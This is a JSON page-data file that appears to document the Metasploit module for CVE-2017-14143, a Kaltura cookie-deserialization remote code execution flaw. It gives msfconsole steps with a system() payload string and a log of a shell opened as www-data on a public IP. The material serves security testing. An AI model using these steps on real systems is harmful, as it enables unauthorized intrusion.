{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/kaltura_unserialize_cookie_rce","result":{"data":{"moduleMetadataJson":{"id":"62aed844-ba4b-5614-ad3e-1d34cfbf7f71","name":"Kaltura Remote PHP Code Execution over Cookie","fullname":"exploit/linux/http/kaltura_unserialize_cookie_rce","description":"This module exploits an Object Injection vulnerability in Kaltura.\n        By exploiting this vulnerability, unauthenticated users can execute\n        arbitrary code under the context of the web server user.\n\n        Kaltura makes use of a hardcoded cookie secret which allows to sign\n        arbitrary cookie data. After passing this signature check, the base64-\n        decoded data is passed to PHPs unserialize() function which allows for\n        code execution. The constructed object is again based on the SektionEins\n        Zend code execution POP chain PoC. Kaltura versions prior to 13.1.0 are\n        affected by this issue.\n\n        A valid entry_id (which is required for this exploit) can be obtained\n        from any media resource published on the kaltura installation.\n\n        This module was tested against Kaltura 13.1.0-2 installed on Ubuntu 14.04.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/kaltura_unserialize_cookie_rce","documentationSlug":"/modules/documentation/exploit/linux/http/kaltura_unserialize_cookie_rce","referencesSlug":"/modules/references/exploit/linux/http/kaltura_unserialize_cookie_rce"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>The getUserzoneCookie function in Kaltura before 13.2.0 uses a hardcoded cookie secret to validate cookie signatures, which allows remote attackers to bypass an intended protection mechanism and consequently conduct PHP object injection attacks and execute arbitrary PHP code via a crafted userzone cookie. </p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p> This module exploits a remote code execution within the Kaltura(&#x3C;=13.1.0) via a cookie deserialization.\nVulnerability reference- <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14143\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14143</a>.\nInstallation of Kaltura is difficult, but here is an installation guide:\n<a href=\"https://github.com/kaltura/platform-install-packages/blob/Mercury-13.8.0/doc/install-kaltura-deb-based.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/kaltura/platform-install-packages/blob/Mercury-13.8.0/doc/install-kaltura-deb-based.md</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li><code class=\"language-text\">use exploit/linux/http/kaltura_unserialize_cookie_rce</code></li>\n<li><code class=\"language-text\">set RHOST https://example.com (or IP address)</code></li>\n<li><code class=\"language-text\">set ENTRYID 0_xxxxxxxx</code></li>\n<li><code class=\"language-text\">set payload generic/custom</code></li>\n<li><code class=\"language-text\">set payloadstr &quot;system(&#39;command you want to execute, eg.- ls -la&#39;);&quot;</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf use exploits/linux/http/kaltura_unserialize_cookie_rce\nmsf exploit(kalkutra_unseialize_cookie_rce) set RHOST 46.101.209.202\nRHOST =&gt; 46.101.209.202\nmsf exploit(kalkutra_unseialize_cookie_rce) set LHOST 192.168.1.16\nLHOST =&gt; 192.168.1.16\nmsf exploit(kalkutra_unseialize_cookie_rce)&gt;check\n[+] 46.101.209.202:4444 The target is vulnerable.\nmsf exploit(kalkutra_unseialize_cookie_rce)&gt;run\n[*] Started bind handler\n[*] Output:\n[*] Command shell session 1 opened (192.168.1.16:36865 -&gt; 46.101.209.202:4444) at 2017-09-04 12:09:03 +0200\n\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"62aed844-ba4b-5614-ad3e-1d34cfbf7f71"}}}